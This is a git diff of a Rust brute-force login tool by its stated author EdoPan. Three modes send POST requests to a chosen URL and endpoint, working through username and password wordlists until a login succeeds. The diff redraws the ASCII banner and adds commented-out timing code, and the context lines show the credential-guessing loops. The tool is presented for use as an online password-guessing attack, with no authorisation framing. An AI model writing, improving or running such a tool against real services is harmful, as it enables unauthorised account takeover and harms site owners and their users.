@@ -2,23 +2,29 @@ use std::io::{self, BufRead};
 use std::fs::File;
 use std::io::Write;
 use reqwest::blocking::Client;
+//use std::time::Instant;
 
 fn handle_mode() -> (i32, String, String) {
     println!("
-    __________                __           ___________                          __________                __    
-    \\______   \\_______ __ ___/  |_  ____   \\_   _____/__________   ____  ____   \\______   \\__ __  _______/  |_  
-     |    |  _/\\_  __ \\  |  \\   __\\/ __ \\   |    __)/  _ \\_  __ \\_/ ___\\/ __ \\   |       _/  |  \\/  ___/\\   __\\ 
-     |    |   \\ |  | \\/  |  /|  | \\  ___/   |     \\(  <_> )  | \\/\\  \\__\\  ___/   |    |   \\  |  /\\___ \\  |  |   
-     |______  / |__|  |____/ |__|  \\___  >  \\___  / \\____/|__|    \\___  >___  >  |____|_  /____//____  > |__|   
-            \\/                         \\/       \\/                    \\/    \\/          \\/           \\/         
-    -----------------------------------------------------------------------------------------------------------
-    A simple Rust brute force script by EdoPan.
-    Three modes are provided: Single, Fixed Username, Advanced.
-    Single: Insert manually username and password.
-    Fixed: Insert a username and a password.txt file that will be iterated.
-    Advanced: Insert a username.txt file and a password.txt file both files will be iterated.
-    Insert the URL, the endpoint for the POST and the mode and you are ready to rock!
-    -----------------------------------------------------------------------------------------------------------
+ ____             _                           
+| __ ) _ __ _   _| |_ ___                     
+|  _ \\| '__| | | | __/ _ \\                    
+| |_) | |  | |_| | ||  __/                    
+|____/|_|   \\__,_|\\__\\___|____            _   
+|  ___|__  _ __ ___ ___  |  _ \\ _   _ ___| |_ 
+| |_ / _ \\| '__/ __/ _ \\ | |_) | | | / __| __|
+|  _| (_) | | | (_|  __/ |  _ <| |_| \\__ \\ |_ 
+|_|  \\___/|_|  \\___\\___| |_| \\_\\\\__,_|___/\\__|       
+
+-----------------------------------------------------------------------
+A simple brute force script in Rust by EdoPan.
+Insert the URL and the POST endpoint.
+Three modes are provided: Single, Fixed and Advanced.
+Single: Insert manually username and password.
+Fixed: Insert a username and a password.txt file that will be iterated.
+Advanced: Insert a username.txt file and a password.txt file 
+both files will be iterated.
+-----------------------------------------------------------------------
     ");
     print!("Insert URL: ");
     io::stdout().flush().unwrap();
@@ -76,9 +82,14 @@ fn handle_fixed_mode(address: String, client: Client) {
     let path = String::from("./data/".to_owned() + &file_name);
     let file = File::open(path).unwrap();
     let lines = io::BufReader::new(file).lines();
+    //let mut counter: i32 = 0;
+    //let now = Instant::now();
     for line in lines.flatten() {
         let password = line.replace("\n", "");
         let response = make_request(address.clone(), client.clone(), username.clone().replace("\n", ""), password);
+        //let elapsed_time = now.elapsed();
+        //counter += 1;
+        //println!("Request #{} time elapsed: {}", counter, elapsed_time.as_millis());
         if response == true {
             break;
         }
@@ -105,13 +116,21 @@ fn handle_advanced_mode(address: String, client: Client) {
     let passwords_file = File::open(passwords_path).unwrap();
     let passwords_buffer: io::Lines<io::BufReader<File>> = io::BufReader::new(passwords_file).lines();
     let mut password_list: Vec<String> = Vec::new();
+    //let now = Instant::now();
     for password in passwords_buffer.flatten() {
         password_list.push(password.replace("\n", ""));
     }
+    //let elapsed_time = now.elapsed();
+    //println!("Time elapsed to read the file: {}", elapsed_time.as_millis());
     'outer: for u in users.flatten() {
         let username: String = u.replace("\n", "");
+        //let mut counter: i32 = 0;
+        //let now = Instant::now();
         for password in password_list.clone() {
             let response = make_request(address.clone(), client.clone(), username.clone().replace("\n", ""), password);
+            //let elapsed_time = now.elapsed();
+            //counter += 1;
+            //println!("Request #{} time elapsed: {}", counter, elapsed_time.as_millis());
             if response == true {
                 break 'outer;
             }
@@ -151,4 +170,3 @@ fn main() {
         _ => ()
     }
 }
-
